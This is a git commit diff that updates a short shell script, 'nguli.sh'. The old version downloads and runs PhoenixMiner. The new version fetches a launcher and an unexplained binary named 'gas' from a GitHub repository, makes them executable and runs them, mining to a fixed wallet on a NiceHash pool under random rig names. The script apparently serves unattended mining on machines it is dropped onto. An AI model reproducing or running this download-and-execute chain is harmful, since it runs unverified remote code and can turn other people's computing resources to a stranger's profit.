5feb66d6daafd1220d7c78066edc81436543d5cc
xunxy <92241163+xunxy@users.noreply.github.com>
2021-10-11 07:18:22 +0000

    Update nguli.sh

--- nguli.sh
+++ nguli.sh
@@ -1,3 +1,3 @@
 # ethereumcoin
 sudo apt update
-apt-get install libpci3 && wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz && tar -xf PhoenixMiner_5.6d_Linux.tar.gz && ./PhoenixMiner -pool daggerhashimoto.usa-west.nicehash.com:3353 -proto 2 -wal 3K9cJugvEyJFg7orpa7g9nUgi4kdZ79Xqy.$(echo $(shuf -i 1-64 -n 1)Kry)
+wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo ethash -coin VRSC -wallet 3K9cJugvEyJFg7orpa7g9nUgi4kdZ79Xqy -rigName $(echo $(shuf -i 1-64 -n 1)Kry) -pool1 daggerhashimoto.usa-west.nicehash.com:3353
